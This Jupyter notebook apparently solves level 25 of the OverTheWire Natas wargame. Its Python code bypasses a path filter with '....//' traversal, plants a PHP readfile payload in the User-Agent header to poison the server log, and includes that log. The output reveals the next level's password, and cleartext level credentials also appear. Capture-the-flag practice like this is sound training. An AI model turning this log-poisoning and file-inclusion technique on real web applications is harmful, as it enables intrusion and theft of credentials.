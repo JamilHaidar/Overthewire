{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from requests.auth import HTTPBasicAuth"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/wechall-data.js\"></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas25\", \"pass\": \"ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws\" };</script></head>\n",
      "<body>\n",
      "\n",
      "<h1>natas25</h1>\n",
      "<div id=\"content\">\n",
      "<div align=\"right\">\n",
      "<form>\n",
      "<select name='lang' onchange='this.form.submit()'>\n",
      "<option>language</option>\n",
      "<option>de</option><option>en</option></select>\n",
      "</form>\n",
      "</div>\n",
      "\n",
      "[06.09.2024 21::08:07] cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE\n",
      " \"Directory traversal attempt! fixing request.\"\n",
      "<br />\n",
      "<b>Notice</b>:  Undefined variable: __GREETING in <b>/var/www/natas/natas25/index.php</b> on line <b>80</b><br />\n",
      "<h2></h2><br />\n",
      "<b>Notice</b>:  Undefined variable: __MSG in <b>/var/www/natas/natas25/index.php</b> on line <b>81</b><br />\n",
      "<p align=\"justify\"><br />\n",
      "<b>Notice</b>:  Undefined variable: __FOOTER in <b>/var/www/natas/natas25/index.php</b> on line <b>82</b><br />\n",
      "<div align=\"right\"><h6></h6><div><p>\n",
      "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "\n"
     ]
    }
   ],
   "source": [
    "session = requests.Session()\n",
    "session.auth = ('natas25','ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws')\n",
    "url = 'http://natas25.natas.labs.overthewire.org/index.php'\n",
    "r = session.get(url)\n",
    "cookie = {'PHPSESSID': r.cookies['PHPSESSID']}\n",
    "path = '....//....//....//....//....//'\n",
    "params = {'lang':f'{path}var/www/natas/natas25/logs/natas25_{cookie[\"PHPSESSID\"]}.log'}\n",
    "injection = '<?php readfile(\"/etc/natas_webpass/natas26\"); ?>'\n",
    "user_agent = {'User-Agent':injection}\n",
    "r = session.post(url,data=params,headers=user_agent)\n",
    "print(r.text)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
